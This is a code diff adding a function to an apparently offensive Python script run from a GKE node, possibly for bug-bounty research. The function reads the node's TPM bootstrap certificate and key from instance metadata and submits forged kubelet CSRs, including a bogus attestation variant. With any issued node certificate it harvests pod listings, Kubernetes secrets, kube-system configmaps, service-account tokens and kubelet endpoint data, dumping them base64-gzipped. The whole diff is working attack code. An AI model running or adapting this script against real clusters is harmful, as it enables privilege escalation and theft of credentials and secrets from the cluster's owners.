@@ -643,5 +643,214 @@ def plugin():
 
 
 
+def _csrname(keypem, cn, org, usages):
+    import hashlib
+    try:
+        h = hashlib.new("sha512_256")
+    except Exception:
+        h = hashlib.sha256()
+    for part in [keypem, cn, org] + usages:
+        h.update(base64.urlsafe_b64encode(part.encode()).rstrip(b"="))
+        h.update(b"|")
+    return "node-csr-" + base64.urlsafe_b64encode(h.digest()).rstrip(b"=").decode()
+
+
+def csr():
+    """Generate a kubelet node client CSR exactly as gke-exec-auth-plugin tpm mode does
+    (EC key, O=system:nodes, CN=system:node:<instance>, usages ds/ke/ca, node-csr-<digest>),
+    submit it with the TPM bootstrap cert and poll for approval. Variants: plain, with a
+    VM IDENTITY block, and with a bogus attestation triplet."""
+    import subprocess, urllib.parse, time
+    out("===CSR-BEGIN===")
+    st, kvb = md_get("instance/attributes/kube-env", timeout=15)
+    kv = kvb.decode("utf8", "replace")
+    node = md_get("instance/name")[1].decode().strip()
+    nodeip = md_get("instance/network-interfaces/0/ip")[1].decode().strip()
+    out("NODE %s NODEIP %s KUBEENV status=%s len=%d" % (node, nodeip, st, len(kv)))
+    ca = _kv(kv, "CA_CERT"); bootc = _kv(kv, "TPM_BOOTSTRAP_CERT"); bootk = _kv(kv, "TPM_BOOTSTRAP_KEY")
+    open("/tmp/ca.crt", "wb").write(ca or b"")
+    open("/tmp/boot.crt", "wb").write(bootc or b"")
+    open("/tmp/boot.key", "wb").write(bootk or b"")
+    m = re.search(r"^KUBERNETES_MASTER_NAME:\s*(\S+)\s*$", kv, re.M)
+    srv = "https://" + (m.group(1) if m else "10.214.0.4")
+    out("SERVER %s CACERT %d BOOTCERT %d BOOTKEY %d" % (srv, len(ca or b""), len(bootc or b""), len(bootk or b"")))
+    ctx0 = ssl.create_default_context(cafile="/tmp/ca.crt")
+    ctxb = ssl.create_default_context(cafile="/tmp/ca.crt")
+    ctxb.load_cert_chain("/tmp/boot.crt", "/tmp/boot.key")
+
+    def call(path, method="GET", body=None, ctx=None, auth=None, timeout=25, ctype="application/json"):
+        h = {"Content-Type": ctype, "Accept": "application/json"}
+        if auth:
+            h["Authorization"] = "Bearer " + auth
+        req = urllib.request.Request(srv + path, method=method, data=body, headers=h)
+        try:
+            r = urllib.request.urlopen(req, context=ctx or ctxb, timeout=timeout)
+            return r.status, r.read()
+        except urllib.error.HTTPError as e:
+            return e.code, e.read()
+        except Exception as e:
+            return -1, repr(e).encode()
+
+    # baseline: bootstrap identity
+    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                       "spec": {"namespace": "bhs"}}).encode()
+    s, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
+    out("BOOT-SSRR status=%s %s" % (s, b[:600].decode("utf8", "replace")))
+    # oauth token with explicit scopes vs apiserver (scoped retry)
+    stt, tokb = md_get("instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform,https://www.googleapis.com/auth/userinfo.email")
+    try:
+        scoped = json.loads(tokb.decode()).get("access_token", "")
+    except Exception:
+        scoped = ""
+    s, b = call("/api/v1/nodes", ctx=ctx0, auth=scoped)
+    out("SCOPEDTOKEN nodes status=%s %s" % (s, b[:200].decode("utf8", "replace")))
+    s, b = call("/version", ctx=ctx0, auth=scoped)
+    out("SCOPEDTOKEN version status=%s %s" % (s, b[:200].decode("utf8", "replace")))
+
+    # EC key + CSR
+    os.system("openssl ecparam -genkey -name prime256v1 -out /tmp/k.pem 2>/dev/null")
+    cnf = "[ req ]\nprompt = no\ndefault_md = sha256\ndistinguished_name = dname\n\n[ dname ]\nO = system:nodes\nCN = system:node:%s\n" % node
+    open("/tmp/req.cnf", "w").write(cnf)
+    os.system("openssl req -new -config /tmp/req.cnf -key /tmp/k.pem -out /tmp/n.csr 2>/dev/null")
+    keypem = open("/tmp/k.pem").read()
+    csr_pem = open("/tmp/n.csr", "rb").read()
+    out("CSR generated key=%d csr=%d" % (len(keypem), len(csr_pem)))
+    os.system("openssl req -in /tmp/n.csr -noout -subject 2>&1 | head -2")
+
+    usages = ["digital signature", "key encipherment", "client auth"]
+    ident = json.dumps({"tenantID": "220541406316", "nodePool": "default-pool", "projectNumber": "220541406316",
+                        "zone": "europe-west10-a", "instanceName": node, "instance": node}).encode()
+    att_data = b"FAKE-ATTESTATION-DATA-" + os.urandom(32)
+    att_sig = os.urandom(256)
+    variants = [("plain", b""), ("identity", b"-----BEGIN VM IDENTITY-----\n" + base64.encodebytes(ident) + b"-----END VM IDENTITY-----\n"),
+                ("attest", b"-----BEGIN ATTESTATION DATA-----\n" + base64.encodebytes(att_data) + b"-----END ATTESTATION DATA-----\n-----BEGIN ATTESTATION SIGNATURE-----\n" + base64.encodebytes(att_sig) + b"-----END ATTESTATION SIGNATURE-----\n-----BEGIN VM IDENTITY-----\n" + base64.encodebytes(ident) + b"-----END VM IDENTITY-----\n")]
+    got = None
+    for tag, extra in variants:
+        name = _csrname(keypem, "system:node:" + node, "system:nodes", usages)
+        if tag != "plain":
+            name = name + "-" + tag
+        reqb64 = base64.b64encode(csr_pem + extra).decode()
+        cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
+                            "metadata": {"name": name},
+                            "spec": {"request": reqb64, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
+                                     "usages": usages}}).encode()
+        s, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
+        out("CSR[%s] create status=%s %s" % (tag, s, b[:300].decode("utf8", "replace")))
+        cert = None
+        for i in range(40):
+            time.sleep(3)
+            s, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + name)
+            if s == 200:
+                d = json.loads(b)
+                c = d.get("status", {}).get("certificate")
+                out("CSR[%s] poll %d conds=%s certlen=%s" % (tag, i, d.get("status", {}).get("conditions"), len(c) if c else 0))
+                if c:
+                    cert = base64.b64decode(c)
+                    break
+            elif s == 404:
+                out("CSR[%s] poll %d 404" % (tag, i))
+        if cert:
+            open("/tmp/ncrt.pem", "wb").write(cert)
+            got = tag
+            out("CSR[%s] ISSUED len=%d" % (tag, len(cert)))
+            os.system("openssl x509 -in /tmp/ncrt.pem -noout -subject -issuer -dates 2>&1 | head -4")
+            break
+    if not got:
+        out("NO CERT ISSUED")
+        out("===CSR-END===")
+        return
+    ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
+    ctxn.load_cert_chain("/tmp/ncrt.pem", "/tmp/k.pem")
+
+    def ncall(path, method="GET", body=None, timeout=25):
+        return call(path, method=method, body=body, ctx=ctxn, timeout=timeout)
+
+    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                       "spec": {"namespace": "bhs"}}).encode()
+    s, b = ncall("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
+    out("NODE-SSRR status=%s\n%s" % (s, b[:6000].decode("utf8", "replace")))
+    s, b = ncall("/api/v1/nodes")
+    out("NODE nodes status=%s len=%d" % (s, len(b)))
+    if s == 200:
+        out("--nodejson-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--nodejson-end--")
+    pods = []
+    for path in ["/api/v1/pods?fieldSelector=" + urllib.parse.quote("spec.nodeName=" + node) + "&limit=500",
+                 "/api/v1/pods?limit=500"]:
+        s, b = ncall(path)
+        out("PODS %s status=%s len=%d %s" % (path[:80], s, len(b), b[:200].decode("utf8", "replace")))
+        if s == 200:
+            out("--pods-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--pods-end--")
+            try:
+                pods = json.loads(b).get("items", [])
+            except Exception:
+                pass
+            break
+    secretrefs = []; sapairs = []
+    for p in pods:
+        md = p.get("metadata", {}); ns = md.get("namespace"); spec = p.get("spec", {})
+        secs = []
+        for v in (spec.get("volumes") or []):
+            if v.get("secret"):
+                secs.append(v["secret"].get("secretName"))
+            for src in (v.get("projected", {}) or {}).get("sources", []) or []:
+                if src.get("secret"):
+                    secs.append(src["secret"].get("name"))
+        for c in (spec.get("containers") or []) + (spec.get("initContainers") or []):
+            for e in (c.get("env") or []):
+                if e.get("valueFrom", {}).get("secretKeyRef"):
+                    secs.append(e["valueFrom"]["secretKeyRef"].get("name"))
+            for ef in (c.get("envFrom") or []):
+                if ef.get("secretRef"):
+                    secs.append(ef["secretRef"].get("name"))
+        out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s|imgs=%s" % (ns, md.get("name"), spec.get("nodeName"),
+            spec.get("serviceAccountName"), p.get("status", {}).get("phase"), secs,
+            [c.get("image") for c in (spec.get("containers") or [])]))
+        if ns and spec.get("serviceAccountName"):
+            sapairs.append((ns, spec["serviceAccountName"]))
+        for sname in set(x for x in secs if x):
+            secretrefs.append((ns, sname))
+    for ns, sname in sorted(set(secretrefs)):
+        s, b = ncall("/api/v1/namespaces/%s/secrets/%s" % (ns, sname))
+        out("SECRET %s/%s status=%s len=%d" % (ns, sname, s, len(b)))
+        if s == 200:
+            out("--secret-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--secret-end--")
+            try:
+                d = json.loads(b)
+                out("SECRET-KEYS %s/%s type=%s keys=%s" % (ns, sname, d.get("type"), sorted((d.get("data") or {}).keys())))
+            except Exception:
+                pass
+    for ns, sa in sorted(set(sapairs)):
+        body = json.dumps({"apiVersion": "authentication.k8s.io/v1", "kind": "TokenRequest",
+                           "spec": {"audiences": ["https://container.googleapis.com/v1/projects/220541406316/zones/europe-west10-a/clusters/jup-test"], "expirationSeconds": 3600}}).encode()
+        s, b = ncall("/api/v1/namespaces/%s/serviceaccounts/%s/token" % (ns, sa), "POST", body)
+        out("SATOKEN %s/%s status=%s %s" % (ns, sa, s, b[:300].decode("utf8", "replace")))
+        if s in (200, 201):
+            out("--satoken-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--satoken-end--")
+    for ns in ["bhs", "kube-system"]:
+        for res in ["secrets", "configmaps", "serviceaccounts", "pods"]:
+            s, b = ncall("/api/v1/namespaces/%s/%s?limit=500" % (ns, res))
+            out("LIST %s/%s status=%s len=%d %s" % (ns, res, s, len(b), b[:120].decode("utf8", "replace")))
+            if s == 200:
+                out("--list-%s-%s-b64gzip--" % (ns, res)); out(base64.b64encode(gzip.compress(b)).decode()); out("--list-end--")
+    for url in ["http://%s:10255/pods" % nodeip, "http://%s:10255/configz" % nodeip, "http://%s:10255/spec" % nodeip]:
+        try:
+            r = urllib.request.urlopen(url, timeout=8); b = r.read()
+            out("KUBELET-RO %s status=%s len=%d" % (url, r.status, len(b)))
+            out("--kubelet-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-end--")
+        except Exception as e:
+            out("KUBELET-RO %s ERR %r" % (url, e))
+    for url in ["https://%s:10250/pods" % nodeip, "https://%s:10250/configz" % nodeip]:
+        try:
+            r = urllib.request.urlopen(urllib.request.Request(url), context=ctxn, timeout=8); b = r.read()
+            out("KUBELET-TLS %s status=%s len=%d" % (url, r.status, len(b)))
+            out("--kubelet-tls-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-tls-end--")
+        except urllib.error.HTTPError as e:
+            out("KUBELET-TLS %s HTTP %s %s" % (url, e.code, e.read()[:200].decode("utf8", "replace")))
+        except Exception as e:
+            out("KUBELET-TLS %s ERR %r" % (url, e))
+    out("===CSR-END===")
+
+
+
 if __name__ == "__main__":
-    {"meta": meta, "api": api, "api5": api5, "plugin": plugin}[sys.argv[1]]()
+    {"meta": meta, "api": api, "api5": api5, "plugin": plugin, "csr": csr}[sys.argv[1]]()
